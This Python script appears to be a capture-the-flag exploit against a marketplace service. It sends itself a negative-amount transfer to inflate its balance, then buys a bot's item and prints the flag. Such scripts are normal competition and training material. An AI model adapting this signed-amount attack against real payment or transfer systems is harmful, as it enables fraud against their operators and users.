#!/usr/bin/env python3

import sys
import random
import string

from bot_client import BotClient
from client import Client, User


SERVICE_PORT = 10050

BOT_USERNAME = 'marketbot'

USERNAME_LENGTH = 12
PASSWORD_LENGTH = 16


def randstr(length: int) -> str:
    alphabet = string.ascii_letters + string.digits
    return ''.join(random.choices(alphabet, k=length))


def randuser() -> User:
    username = randstr(USERNAME_LENGTH)
    password = randstr(PASSWORD_LENGTH)
    return User(username, password)


def randuser_auth(client: Client) -> User:
    user = randuser()
    client.user = user
    client.register(exist_ok=True)
    client.auth()
    return user


def exploit(client: Client, flagid: str):
    assert flagid.startswith('item:')
    item_id = int(flagid[len('item:'):])

    randuser_auth(client)

    bot_uid = client.get_userid(BOT_USERNAME)
    bot = BotClient(client, bot_uid)

    seller, price, currency, _ = bot.info(item_id)

    # BUG: amount is signed, exploit it to add to balance
    client.transfer(client.user.userid, currency, -price)

    receipt = client.transfer(seller, currency, price)
    token = bot.buy(item_id, receipt)
    flag = bot.view(token)

    print(flag)


def main():
    if len(sys.argv) != 3:
        print(f'Usage: {sys.argv[0]} <host> <flag ID>', file=sys.stderr)
        exit(1)

    host, flagid = sys.argv[1:]

    client = Client()
    client.connect(host, SERVICE_PORT)

    exploit(client, flagid)


if __name__ == '__main__':
    main()
